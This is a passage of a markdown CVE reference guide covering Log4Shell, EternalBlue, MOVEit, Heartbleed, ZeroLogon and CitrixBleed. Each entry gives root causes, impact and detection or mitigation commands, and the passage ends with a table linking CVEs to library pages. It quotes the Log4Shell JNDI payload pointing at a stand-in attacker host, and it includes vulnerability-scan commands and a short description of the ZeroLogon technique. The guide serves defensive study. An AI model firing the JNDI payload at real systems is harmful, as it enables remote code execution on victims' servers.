CWE: CWE-502 (Deserialization) / CWE-917 (Expression Language Injection)
Disclosed: December 9, 2021 | Exploited: Within hours

Root cause: Log4j processed JNDI expressions (e.g., `${jndi:ldap://attacker.com/a}`)
embedded in any logged string (HTTP User-Agent, username, API parameters).
The JNDI lookup fetched and executed an attacker-controlled Java class.

Detection:

    # Suricata IDS rule
    alert http any any -> any any (msg:"Log4Shell"; content:"${jndi:"; nocase; sid:2034647;)

    # Find vulnerable JARs on disk
    find / -name "log4j-core-*.jar" 2>/dev/null

    # Scan for active exploitation attempts in logs
    grep -ri '${jndi:' /var/log/

Patch path: 2.15.0 (partial) -> 2.16.0 (JNDI disabled by default, CVE-2021-45046 fixed) ->
2.17.0 (CVE-2021-45105 DoS fixed) -> 2.17.1 (CVE-2021-44832 config-file RCE fixed)

Scale: Hundreds of millions of affected systems; exploited within hours by
nation-state APTs (Hafnium, APT41), ransomware groups, and cryptominers.

---

### CVE-2017-0144: EternalBlue (MS17-010)

<!-- hub-links:start (written by scripts/build_hub_links.py from data/hub/tag_counts.json; do not edit) -->

On the Intelligence Hub: [CVE-2017-0144 brief](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-0144)

<!-- hub-links:end -->

Affected: Windows XP through Server 2016 (SMBv1)
CVSS v2: 8.1 HIGH (practical severity ~10.0; wormable)
CWE: CWE-119 (Improper Memory Restriction)
Origin: NSA ETERNALBLUE leaked by Shadow Brokers, April 14, 2017
Patched: March 14, 2017 (MS17-010), one month before leak

Root cause: Buffer overflow in Windows SMBv1 server (srv.sys) transaction
handling. Unauthenticated SYSTEM-level RCE via TCP/445. Wormable.

Aftermath:
- WannaCry (May 2017): 200,000+ systems, 150 countries, $4-8B damage, NHS offline
- NotPetya (June 2017): $10B+ damage, Maersk/Merck/FedEx devastated; GRU Sandworm

Commands:

    nmap -p 445 --script smb-vuln-ms17-010 <target>

    # Disable SMBv1
    Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force

---

### CVE-2023-34362: MOVEit Transfer SQL Injection

<!-- hub-links:start (written by scripts/build_hub_links.py from data/hub/tag_counts.json; do not edit) -->

On the Intelligence Hub: [CVE-2023-34362 brief](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-34362)

<!-- hub-links:end -->

Affected: Progress MOVEit Transfer (all versions, pre-June 2023 patches)
CVSS: 9.8 CRITICAL | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
CWE: CWE-89 (SQL Injection)
Exploited by: Cl0p (TA505) ransomware group, May-June 2023 as 0-day

Technical: SQL injection via HTTP POST to /human.aspx. Cl0p deployed
LEMURLOOT webshell, exfiltrated all stored files. No authentication required.

Impact: 2,500+ organizations, including US DOE/USDA, PBI Research (900,000 SSA records),
Zellis UK payroll (BBC/BA/Boots), universities, government agencies.

Lesson: Silent 0-day exploitation for ~4 weeks before vendor awareness.
Pure data-theft extortion model (no encryption). Supply chain via file transfer infrastructure.

---

### CVE-2014-0160: Heartbleed

<!-- hub-links:start (written by scripts/build_hub_links.py from data/hub/tag_counts.json; do not edit) -->

On the Intelligence Hub: [CVE-2014-0160 brief](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2014-0160)

<!-- hub-links:end -->

Affected: OpenSSL 1.0.1 through 1.0.1f, 1.0.2-beta
CVSS v2: 5.0 MEDIUM (severely understated impact)
CWE: CWE-125 (Out-of-bounds Read)
Disclosed: April 7, 2014 | Exposure window: 2 years (since OpenSSL 1.0.1, March 2012)

Technical: TLS heartbeat extension (RFC 6520) allowed arbitrary memory reads
of up to 64KB per request by specifying a payload length larger than the actual
payload. No authentication, no log trace.

Exposed: Server private TLS keys (enables passive decryption of all traffic),
session tokens, cleartext passwords of active users.

Scale: ~17-25% of global HTTPS servers affected; required emergency mass
certificate revocation and reissuance.

---

### CVE-2020-1472: ZeroLogon

<!-- hub-links:start (written by scripts/build_hub_links.py from data/hub/tag_counts.json; do not edit) -->

On the Intelligence Hub: [CVE-2020-1472 brief](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-1472)

<!-- hub-links:end -->

Affected: Windows Server (Netlogon / MS-NRPC)
CVSS: 10.0 CRITICAL | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
CWE: CWE-330 (Use of Insufficiently Random Values)
Discovered: Tom Tervoort, Secura, August 2020

Technical: Netlogon AES-CFB8 session key establishment with all-zero IV.
AES-CFB8 with zero IV has 1/256 probability of producing all-zero ciphertext
from zero plaintext. ~256 attempts achieve authentication as any machine account
(including domain controller) without knowing credentials. Full domain admin in ~3 seconds.

Patch timeline: Phase 1 (Aug 2020): optional enforcement; Phase 2 (Feb 2021):
mandatory. Microsoft delayed 6 months for legacy device compatibility.

---

### CVE-2023-4966: CitrixBleed

<!-- hub-links:start (written by scripts/build_hub_links.py from data/hub/tag_counts.json; do not edit) -->

On the Intelligence Hub: [CVE-2023-4966 brief](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-4966)

<!-- hub-links:end -->

Affected: Citrix NetScaler ADC and Gateway
CVSS: 9.4 CRITICAL | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
CWE: CWE-125 (Out-of-bounds Read)
Exploited: 0-day before patch; mass exploitation November 2023

Technical: Buffer over-read in NetScaler HTTP header processing leaked valid
session tokens from memory. Unauthenticated attackers bypassed authentication
AND MFA by replaying stolen tokens. No interception of traffic required.

Notable: LockBit 3.0 affiliate exploited CitrixBleed in Boeing breach (Nov 2023,
~45GB exfiltrated). Thousands of appliances remained unpatched weeks after the
Oct 10, 2023 patch release due to slow enterprise edge infrastructure patching.

<!-- hub-links:start (written by scripts/build_hub_links.py from data/hub/tag_counts.json; do not edit) -->

CVEs the library discusses that the Hub also tracks, each with its brief on the Hub and the pages here that name it:

| CVE | Named in |
|---|---|
| [CVE-2008-4250](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2008-4250) | [ICS/OT Security Reference](/ICS_OT_SECURITY_REFERENCE.md) |
| [CVE-2010-2568](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2010-2568) | [ICS/OT Security Reference](/ICS_OT_SECURITY_REFERENCE.md) |
| [CVE-2014-0160](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2014-0160) | [CVE Reference Guide](/CVE_REFERENCE.md), [Network Protocols Reference: Security Perspective](/NETWORK_PROTOCOLS_REFERENCE.md) |
| [CVE-2014-6271](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2014-6271) | [HackTheBox Machine Index](/research/HTB_MACHINE_INDEX.md) |
| [CVE-2014-6324](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2014-6324) | [Active Directory Attack Reference: Defender Edition](/ACTIVE_DIRECTORY_ATTACK_REFERENCE.md) |
| [CVE-2016-5195](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-5195) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Privilege Escalation Reference](/PRIVESC_REFERENCE.md), [Container & Kubernetes Security](/disciplines/container-kubernetes-security.md) |
| [CVE-2016-6277](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-6277) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md) |
| [CVE-2016-10174](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-10174) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md) |
| [CVE-2017-0144](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-0144) | [CVE Reference Guide](/CVE_REFERENCE.md), [Security Glossary](/GLOSSARY.md), [Internet-Facing Services and External Exposure](/INTERNET_FACING_SERVICES_REFERENCE.md), [Network Attacks Reference](/NETWORK_ATTACKS_REFERENCE.md), [Network Protocols Security Reference](/NETWORK_PROTOCOLS_SECURITY.md) |
| [CVE-2017-5715](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-5715) | [Hardware Security Reference](/HARDWARE_SECURITY_REFERENCE.md) |
| [CVE-2017-5753](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-5753) | [Hardware Security Reference](/HARDWARE_SECURITY_REFERENCE.md) |
| [CVE-2017-5754](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-5754) | [Hardware Security Reference](/HARDWARE_SECURITY_REFERENCE.md) |
| [CVE-2017-6334](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-6334) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md) |
| [CVE-2017-7494](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-7494) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md) |
| [CVE-2017-7921](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-7921) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md), [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2017-17562](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-17562) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md) |
| [CVE-2018-0171](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-0171) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Telecom & 5G Security Reference](/TELECOM_5G_SECURITY_REFERENCE.md), [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2018-4063](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-4063) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2018-9276](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-9276) | [HackTheBox Machine Index](/research/HTB_MACHINE_INDEX.md) |
| [CVE-2018-10561](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-10561) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md) |
| [CVE-2018-13379](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-13379) | [SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/SOLARWINDS_SUNBURST.md) |
| [CVE-2018-14847](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-14847) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md) |
| [CVE-2019-0708](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-0708) | [Network Protocols Security Reference](/NETWORK_PROTOCOLS_SECURITY.md) |
| [CVE-2019-2215](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-2215) | [Mobile Security Reference](/MOBILE_SECURITY_REFERENCE.md) |
| [CVE-2019-5544](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-5544) | [Hypervisor & Virtualization Hardening Reference](/HYPERVISOR_SECURITY_REFERENCE.md) |
| [CVE-2019-5736](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-5736) | [Container Security Reference](/CONTAINER_SECURITY_REFERENCE.md), [Kubernetes Security Reference](/KUBERNETES_SECURITY_REFERENCE.md), [Container & Kubernetes Security](/disciplines/container-kubernetes-security.md) |
| [CVE-2019-7192](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-7192) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md) |
| [CVE-2019-7256](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-7256) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2019-9670](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-9670) | [SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/SOLARWINDS_SUNBURST.md) |
| [CVE-2019-11043](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-11043) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2019-11510](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-11510) | [SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/SOLARWINDS_SUNBURST.md) |
| [CVE-2019-16920](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-16920) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md) |
| [CVE-2019-17621](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-17621) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md) |
| [CVE-2019-19781](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-19781) | [HONEYPOT & DECEPTION TECHNOLOGY REFERENCE](/HONEYPOT_DECEPTION_REFERENCE.md), [SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/SOLARWINDS_SUNBURST.md) |
| [CVE-2020-0688](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-0688) | [SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/SOLARWINDS_SUNBURST.md) |
| [CVE-2020-0796](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-0796) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md), [Windows Hardening Reference](/WINDOWS_HARDENING.md) |
| [CVE-2020-1472](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-1472) | [CVE Reference Guide](/CVE_REFERENCE.md), [Penetration Testing Checklists](/PENTEST_CHECKLISTS.md), [Windows Hardening and GPO Reference](/WINDOWS_HARDENING_GPO.md), [SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/SOLARWINDS_SUNBURST.md) |
| [CVE-2020-3992](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-3992) | [Hypervisor & Virtualization Hardening Reference](/HYPERVISOR_SECURITY_REFERENCE.md) |
| [CVE-2020-4006](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-4006) | [SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/SOLARWINDS_SUNBURST.md) |
| [CVE-2020-10148](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-10148) | [SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/SOLARWINDS_SUNBURST.md) |
| [CVE-2020-25506](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-25506) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md) |
| [CVE-2021-1675](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-1675) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Penetration Testing Checklists](/PENTEST_CHECKLISTS.md), [Windows Hardening and GPO Reference](/WINDOWS_HARDENING_GPO.md) |
| [CVE-2021-1879](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-1879) | [Browser Security Reference](/BROWSER_SECURITY_REFERENCE.md) |
| [CVE-2021-4034](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-4034) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Privilege Escalation Reference](/PRIVESC_REFERENCE.md) |
| [CVE-2021-20090](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-20090) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md) |
| [CVE-2021-22681](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-22681) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2021-22893](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-22893) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md) |
| [CVE-2021-25394](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-25394) | [Mobile Security Reference](/MOBILE_SECURITY_REFERENCE.md) |
| [CVE-2021-26828](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-26828) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2021-26829](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-26829) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2021-26855](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-26855) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2021-27065](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-27065) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2021-27101](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-27101) | [The Cl0p MOVEit Breach and the File-Transfer Extortion Playbook: A 2023 Case Study](/case-studies/CL0P_FILE_TRANSFER_2023.md) |
| [CVE-2021-27102](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-27102) | [The Cl0p MOVEit Breach and the File-Transfer Extortion Playbook: A 2023 Case Study](/case-studies/CL0P_FILE_TRANSFER_2023.md) |
| [CVE-2021-27103](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-27103) | [The Cl0p MOVEit Breach and the File-Transfer Extortion Playbook: A 2023 Case Study](/case-studies/CL0P_FILE_TRANSFER_2023.md) |
| [CVE-2021-27104](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-27104) | [The Cl0p MOVEit Breach and the File-Transfer Extortion Playbook: A 2023 Case Study](/case-studies/CL0P_FILE_TRANSFER_2023.md) |
| [CVE-2021-28799](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-28799) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md) |
| [CVE-2021-30116](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-30116) | [Malware Families Reference](/MALWARE_FAMILIES.md) |
| [CVE-2021-30551](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-30551) | [Browser Security Reference](/BROWSER_SECURITY_REFERENCE.md) |
| [CVE-2021-30860](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-30860) | [Mobile Security Reference](/MOBILE_SECURITY_REFERENCE.md), [Mobile Security](/disciplines/mobile-security.md) |
| [CVE-2021-31207](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-31207) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2021-33044](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-33044) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md), [Physical Security Reference](/PHYSICAL_SECURITY_REFERENCE.md) |
| [CVE-2021-34473](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-34473) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md), [Malware Families Reference](/MALWARE_FAMILIES.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2021-34523](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-34523) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2021-34527](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-34527) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Penetration Testing Checklists](/PENTEST_CHECKLISTS.md), [Vulnerability Management](/disciplines/vulnerability-management.md) |
| [CVE-2021-35247](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-35247) | [Log4Shell (CVE-2021-44228): The Case Study](/case-studies/LOG4SHELL.md) |
| [CVE-2021-36260](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-36260) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md), [Physical Security Reference](/PHYSICAL_SECURITY_REFERENCE.md) |
| [CVE-2021-41773](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-41773) | [CVE Reference Guide](/CVE_REFERENCE.md) |
| [CVE-2021-44207](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-44207) | [Log4Shell (CVE-2021-44228): The Case Study](/case-studies/LOG4SHELL.md) |
| [CVE-2021-44228](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-44228) | [CVE Reference Guide](/CVE_REFERENCE.md), [Detection Rule Writing Reference](/DETECTION_RULES_REFERENCE.md), [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md), [HONEYPOT & DECEPTION TECHNOLOGY REFERENCE](/HONEYPOT_DECEPTION_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [OSINT Reference](/OSINT_REFERENCE.md), [Penetration Testing Methodology Reference](/PENETRATION_TESTING_METHODOLOGY.md), [Penetration Testing Checklists](/PENTEST_CHECKLISTS.md), [Red Team Reference: Authorized Operator Field Guide](/RED_TEAM_REFERENCE.md), [Vulnerability Management Reference](/VULNERABILITY_MANAGEMENT_REFERENCE.md), [Log4Shell (CVE-2021-44228): The Case Study](/case-studies/LOG4SHELL.md), [Case Studies](/case-studies/README.md), [Application Security](/disciplines/application-security.md), [Vulnerability Management](/disciplines/vulnerability-management.md), [Spring Boot](/frameworks/spring-boot.md), [Start a Vulnerability Management Program (First 90 Days)](/guides/START_A_VULN_MGMT_PROGRAM.md), [Tool Manuals and Repositories](/tools-research/TOOL_MANUALS_AND_REPOSITORIES.md), [AWS WAF](/tools/aws-waf.md) |
| [CVE-2021-45046](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-45046) | [CVE Reference Guide](/CVE_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Penetration Testing Methodology Reference](/PENETRATION_TESTING_METHODOLOGY.md), [Log4Shell (CVE-2021-44228): The Case Study](/case-studies/LOG4SHELL.md) |
| [CVE-2022-0185](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-0185) | [Kubernetes Security Reference](/KUBERNETES_SECURITY_REFERENCE.md) |
| [CVE-2022-0847](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-0847) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Privilege Escalation Reference](/PRIVESC_REFERENCE.md), [Container & Kubernetes Security](/disciplines/container-kubernetes-security.md), [Vulnerability Management](/disciplines/vulnerability-management.md) |
| [CVE-2022-1388](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-1388) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md) |
| [CVE-2022-21894](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-21894) | [Hardware Security Reference](/HARDWARE_SECURITY_REFERENCE.md), [Malware Families Reference](/MALWARE_FAMILIES.md) |
| [CVE-2022-22965](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-22965) | [Spring Boot](/frameworks/spring-boot.md) |
| [CVE-2022-26134](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-26134) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md), [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md) |
| [CVE-2022-26143](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-26143) | [Wireless Security Reference](/WIRELESS_SECURITY_REFERENCE.md) |
| [CVE-2022-30190](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-30190) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2022-38028](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-38028) | [ATT&CK Campaigns Reference](/ATTACK_CAMPAIGNS_REFERENCE.md) |
| [CVE-2022-40684](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-40684) | [Vulnerability Management](/disciplines/vulnerability-management.md) |
| [CVE-2022-42475](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-42475) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md), [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2022-42856](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2022-42856) | [Mobile Security Reference](/MOBILE_SECURITY_REFERENCE.md) |
| [CVE-2023-0266](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-0266) | [Mobile Security Reference](/MOBILE_SECURITY_REFERENCE.md) |
| [CVE-2023-0386](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-0386) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2023-0669](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-0669) | [The Cl0p MOVEit Breach and the File-Transfer Extortion Playbook: A 2023 Case Study](/case-studies/CL0P_FILE_TRANSFER_2023.md), [Case Studies](/case-studies/README.md) |
| [CVE-2023-3519](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-3519) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2023-4346](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-4346) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2023-4863](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-4863) | [Browser Security Reference](/BROWSER_SECURITY_REFERENCE.md) |
| [CVE-2023-4911](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-4911) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2023-4966](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-4966) | [CVE Reference Guide](/CVE_REFERENCE.md), [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [Malware Families Reference](/MALWARE_FAMILIES.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Triage a New CVE in 30 Minutes](/guides/TRIAGE_A_CVE.md) |
| [CVE-2023-6448](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-6448) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2023-20198](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-20198) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [Network Attacks Reference](/NETWORK_ATTACKS_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Telecom & 5G Security Reference](/TELECOM_5G_SECURITY_REFERENCE.md) |
| [CVE-2023-20269](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-20269) | [Malware Families Reference](/MALWARE_FAMILIES.md) |
| [CVE-2023-20273](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-20273) | [Network Attacks Reference](/NETWORK_ATTACKS_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Telecom & 5G Security Reference](/TELECOM_5G_SECURITY_REFERENCE.md) |
| [CVE-2023-20867](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-20867) | [Hypervisor & Virtualization Hardening Reference](/HYPERVISOR_SECURITY_REFERENCE.md) |
| [CVE-2023-22518](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-22518) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md) |
| [CVE-2023-27997](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-27997) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md) |
| [CVE-2023-29357](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-29357) | [Starred Repositories Index](/STARRED_REPOS.md) |
| [CVE-2023-34048](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-34048) | [Hypervisor & Virtualization Hardening Reference](/HYPERVISOR_SECURITY_REFERENCE.md) |
